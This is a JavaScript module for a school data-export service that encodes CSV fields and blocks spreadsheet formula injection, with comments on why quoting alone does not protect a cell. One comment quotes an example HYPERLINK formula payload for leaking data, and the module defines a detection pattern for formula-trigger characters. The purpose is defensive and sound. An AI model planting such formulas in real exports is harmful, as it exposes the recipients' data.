'use strict';

/**
 * @file csv.js
 * @description CSV field encoding, with the spreadsheet formula-injection defence (OWASP).
 *
 * This lived three times inside modules/partner/ — one copy per export controller — and
 * nowhere else, so every student, teacher and parent export written through
 * `shared/services/export.service.js` shipped without it. A defence duplicated in a leaf
 * module and absent from the layer beneath is the shape that keeps producing this bug: the
 * next export is written against the shared service, and inherits nothing.
 */

/**
 * Leading characters that make a spreadsheet treat a cell as a formula rather than text.
 * Tab and CR are included because Excel strips them and then re-examines whatever
 * character survives at the front.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Neutralizes formula injection in one cell value.
 *
 * Correct CSV quoting does NOT prevent this. Quotes are CSV syntax: the parser consumes
 * them, and what lands in the cell is the raw string, which Excel / LibreOffice / Sheets
 * then evaluate if it opens with =, +, - or @. `=HYPERLINK("http://…"&A1,"Click")` in an
 * exported name field is a working credential-exfiltration link in the recipient's
 * spreadsheet.
 *
 * The prefix is a single apostrophe — the spreadsheet convention for "this cell is literal
 * text". It is not displayed.
 *
 * @param {*} value - Raw cell value
 * @returns {string} Value safe to place in a CSV cell
 */
const csvCell = (value) => {
  const s = value === null || value === undefined ? '' : String(value);
  return FORMULA_TRIGGERS.test(s) ? `'${s}` : s;
};

/**
 * Full CSV field encoder: neutralize, THEN quote.
 *
 * The order is load-bearing. Quoting first would place the apostrophe outside the quotes,
 * where it is CSV syntax rather than cell content, and the formula would still evaluate.
 *
 * @param {*} value
 * @returns {string} A quoted, injection-safe CSV field
 */
const csvField = (value) => `"${csvCell(value).replace(/"/g, '""')}"`;

/**
 * Deliberately NOT applied to the .xlsx path.
 *
 * ExcelJS stores a string assigned to a cell as a shared string; a formula requires the
 * explicit object form (`cell.value = { formula: … }`), which this codebase never builds
 * from user data. The Excel export therefore has no formula sink. Stated here because
 * applying the defence there anyway would teach the next reader that csvCell is a general
 * string cleaner — and they would then leave it out somewhere it does matter.
 */

module.exports = { csvCell, csvField, FORMULA_TRIGGERS };
